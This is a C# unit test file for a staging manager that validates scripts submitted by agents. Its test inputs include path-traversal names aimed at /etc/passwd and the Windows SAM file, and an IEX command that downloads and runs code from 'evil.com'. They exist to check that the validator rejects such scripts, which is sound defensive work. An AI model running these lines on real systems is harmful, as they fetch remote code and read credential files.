using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using Moq;
using Xunit;

namespace WAiSA.API.Security.Staging.Tests
{
    /// <summary>
    /// Unit tests for SecureStagingManager.
    /// </summary>
    public sealed class SecureStagingManagerTests : IDisposable
    {
        private readonly Mock<ILogger<SecureStagingManager>> _mockLogger;
        private readonly SecureStagingManager _stagingManager;
        private readonly string _testBasePath;

        public SecureStagingManagerTests()
        {
            _mockLogger = new Mock<ILogger<SecureStagingManager>>();
            _stagingManager = new SecureStagingManager(_mockLogger.Object);

            // Use temp directory for testing
            _testBasePath = Path.Combine(Path.GetTempPath(), "waisa-staging-tests");
            Directory.CreateDirectory(_testBasePath);
        }

        [Fact]
        public async Task CreateStagingEnvironment_ValidInput_CreatesDirectoryStructure()
        {
            // Arrange
            var agentId = "test-agent";
            var sessionId = Guid.NewGuid().ToString();

            // Act
            var environment = await _stagingManager.CreateStagingEnvironmentAsync(
                agentId,
                sessionId,
                CancellationToken.None);

            // Assert
            Assert.NotNull(environment);
            Assert.Equal(agentId, environment.AgentId);
            Assert.Equal(sessionId, environment.SessionId);
            Assert.True(Directory.Exists(environment.RootPath));
            Assert.True(Directory.Exists(environment.ScriptsPath));
            Assert.True(Directory.Exists(environment.InputsPath));
            Assert.True(Directory.Exists(environment.OutputsPath));
            Assert.True(Directory.Exists(environment.LogsPath));
            Assert.True(environment.ExpiresAt > DateTimeOffset.UtcNow);
            Assert.False(environment.IsExpired());

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Theory]
        [InlineData(null, "session-123")]
        [InlineData("", "session-123")]
        [InlineData("agent-123", null)]
        [InlineData("agent-123", "")]
        public async Task CreateStagingEnvironment_InvalidInput_ThrowsArgumentException(
            string agentId,
            string sessionId)
        {
            // Act & Assert
            await Assert.ThrowsAsync<ArgumentException>(async () =>
                await _stagingManager.CreateStagingEnvironmentAsync(
                    agentId,
                    sessionId,
                    CancellationToken.None));
        }

        [Fact]
        public async Task ValidateAndStageScript_ValidScript_ReturnsSuccess()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptContent = "Get-Process | Select-Object Name, CPU";
            var scriptName = "test-script.ps1";

            // Act
            var result = await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                scriptName,
                CancellationToken.None);

            // Assert
            Assert.True(result.IsValid);
            Assert.NotNull(result.Checksum);
            Assert.NotEmpty(result.Checksum);
            Assert.Equal(64, result.Checksum.Length); // SHA256 hex length
            Assert.True(File.Exists(result.StagedFilePath));
            Assert.Empty(result.Errors);
            Assert.True(result.FileSizeBytes > 0);

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Theory]
        [InlineData("../../../etc/passwd")]
        [InlineData("..\\..\\windows\\system32\\config\\sam")]
        [InlineData("script/../etc/passwd")]
        [InlineData("script\x00.ps1")]
        public async Task ValidateAndStageScript_PathTraversal_ReturnsFail(string scriptName)
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptContent = "Write-Host 'Hello'";

            // Act
            var result = await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                scriptName,
                CancellationToken.None);

            // Assert
            Assert.False(result.IsValid);
            Assert.NotEmpty(result.Errors);
            Assert.Contains(result.Errors, e => e.Contains("path traversal") || e.Contains("invalid characters"));

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Theory]
        [InlineData("Invoke-Expression (Get-Content evil.ps1)")]
        [InlineData("IEX (New-Object Net.WebClient).DownloadString('http://evil.com')")]
        [InlineData("exec('malicious code')")]
        [InlineData("eval('dangerous script')")]
        public async Task ValidateAndStageScript_DangerousPatterns_ReturnsFailOrWarning(string scriptContent)
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptName = "dangerous.ps1";

            // Act
            var result = await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                scriptName,
                CancellationToken.None);

            // Assert
            // Should either fail or have warnings
            Assert.True(!result.IsValid || result.Warnings.Count > 0);

            if (!result.IsValid)
            {
                Assert.NotEmpty(result.Errors);
            }
            else
            {
                Assert.NotEmpty(result.Warnings);
            }

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Fact]
        public async Task ValidateAndStageScript_SuspiciousPatterns_ContainsWarnings()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptContent = "Start-Process notepad.exe";
            var scriptName = "suspicious.ps1";

            // Act
            var result = await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                scriptName,
                CancellationToken.None);

            // Assert
            // Should succeed but with warnings
            Assert.True(result.IsValid);
            Assert.NotEmpty(result.Warnings);
            Assert.Contains(result.Warnings, w => w.Contains("dangerous pattern"));

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Fact]
        public async Task ValidateAndStageScript_FileIsReadOnly_AfterStaging()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptContent = "Write-Output 'Test'";
            var scriptName = "readonly-test.ps1";

            // Act
            var result = await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                scriptName,
                CancellationToken.None);

            // Assert
            Assert.True(result.IsValid);

            var fileInfo = new FileInfo(result.StagedFilePath);

            // On Windows, check ReadOnly attribute
            if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                System.Runtime.InteropServices.OSPlatform.Windows))
            {
                Assert.True((fileInfo.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly);
            }

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Fact]
        public async Task CleanupStagingEnvironment_ExistingEnvironment_RemovesAllFiles()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptContent = "Write-Output 'Test'";

            await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                "cleanup-test.ps1",
                CancellationToken.None);

            var rootPath = environment.RootPath;
            Assert.True(Directory.Exists(rootPath));

            // Act
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);

            // Assert
            Assert.False(Directory.Exists(rootPath));
        }

        [Fact]
        public async Task CleanupStagingEnvironment_NonExistentEnvironment_DoesNotThrow()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var rootPath = environment.RootPath;

            // Manually delete the directory first
            Directory.Delete(rootPath, recursive: true);

            // Act & Assert - should not throw
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Fact]
        public async Task StagingEnvironment_Dispose_TriggersCleanup()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var rootPath = environment.RootPath;
            Assert.True(Directory.Exists(rootPath));

            // Act
            environment.Dispose();

            // Wait a bit for async cleanup
            await Task.Delay(500);

            // Assert
            Assert.True(environment.IsDisposed);

            // Eventually the directory should be cleaned up
            // Note: Dispose triggers async cleanup, so might need to wait
            var maxWait = TimeSpan.FromSeconds(5);
            var stopwatch = System.Diagnostics.Stopwatch.StartNew();

            while (Directory.Exists(rootPath) && stopwatch.Elapsed < maxWait)
            {
                await Task.Delay(100);
            }

            Assert.False(Directory.Exists(rootPath), "Directory should be cleaned up after disposal");
        }

        [Fact]
        public async Task GetBaseStagingPath_ReturnsCorrectPlatformPath()
        {
            // Act
            var basePath = _stagingManager.GetBaseStagingPath();

            // Assert
            Assert.NotNull(basePath);
            Assert.NotEmpty(basePath);

            if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                System.Runtime.InteropServices.OSPlatform.Windows))
            {
                Assert.Contains("AgentStaging", basePath);
            }
            else
            {
                Assert.Contains("agent-staging", basePath);
            }
        }

        [Fact]
        public async Task ValidateAndStageScript_CalculatesCorrectChecksum()
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();
            var scriptContent = "Write-Output 'Checksum Test'";
            var scriptName = "checksum-test.ps1";

            // Act
            var result = await _stagingManager.ValidateAndStageScriptAsync(
                environment,
                scriptContent,
                scriptName,
                CancellationToken.None);

            // Calculate expected checksum manually
            using var sha256 = System.Security.Cryptography.SHA256.Create();
            var contentBytes = System.Text.Encoding.UTF8.GetBytes(scriptContent);
            var hashBytes = sha256.ComputeHash(contentBytes);
            var expectedChecksum = BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();

            // Assert
            Assert.True(result.IsValid);
            Assert.Equal(expectedChecksum, result.Checksum);

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        [Fact]
        public async Task CreateStagingEnvironment_CreatesIsolatedEnvironments()
        {
            // Arrange & Act
            var env1 = await _stagingManager.CreateStagingEnvironmentAsync(
                "agent-1", "session-1", CancellationToken.None);

            var env2 = await _stagingManager.CreateStagingEnvironmentAsync(
                "agent-2", "session-2", CancellationToken.None);

            // Assert - environments should be completely isolated
            Assert.NotEqual(env1.RootPath, env2.RootPath);
            Assert.NotEqual(env1.ScriptsPath, env2.ScriptsPath);

            // Both should exist simultaneously
            Assert.True(Directory.Exists(env1.RootPath));
            Assert.True(Directory.Exists(env2.RootPath));

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(env1);
            await _stagingManager.CleanupStagingEnvironmentAsync(env2);

            Assert.False(Directory.Exists(env1.RootPath));
            Assert.False(Directory.Exists(env2.RootPath));
        }

        [Fact]
        public async Task ValidateAndStageScript_NullEnvironment_ThrowsArgumentNullException()
        {
            // Act & Assert
            await Assert.ThrowsAsync<ArgumentNullException>(async () =>
                await _stagingManager.ValidateAndStageScriptAsync(
                    null,
                    "Write-Output 'Test'",
                    "test.ps1",
                    CancellationToken.None));
        }

        [Theory]
        [InlineData(null, "test.ps1")]
        [InlineData("", "test.ps1")]
        [InlineData("Write-Output 'Test'", null)]
        [InlineData("Write-Output 'Test'", "")]
        public async Task ValidateAndStageScript_InvalidParameters_ThrowsArgumentException(
            string content,
            string name)
        {
            // Arrange
            var environment = await CreateTestEnvironmentAsync();

            // Act & Assert
            await Assert.ThrowsAsync<ArgumentException>(async () =>
                await _stagingManager.ValidateAndStageScriptAsync(
                    environment,
                    content,
                    name,
                    CancellationToken.None));

            // Cleanup
            await _stagingManager.CleanupStagingEnvironmentAsync(environment);
        }

        private async Task<StagingEnvironment> CreateTestEnvironmentAsync()
        {
            var agentId = $"test-agent-{Guid.NewGuid():N}";
            var sessionId = Guid.NewGuid().ToString();

            return await _stagingManager.CreateStagingEnvironmentAsync(
                agentId,
                sessionId,
                CancellationToken.None);
        }

        public void Dispose()
        {
            _stagingManager?.Dispose();

            // Cleanup test directories
            if (Directory.Exists(_testBasePath))
            {
                try
                {
                    Directory.Delete(_testBasePath, recursive: true);
                }
                catch
                {
                    // Best effort cleanup
                }
            }
        }
    }
}
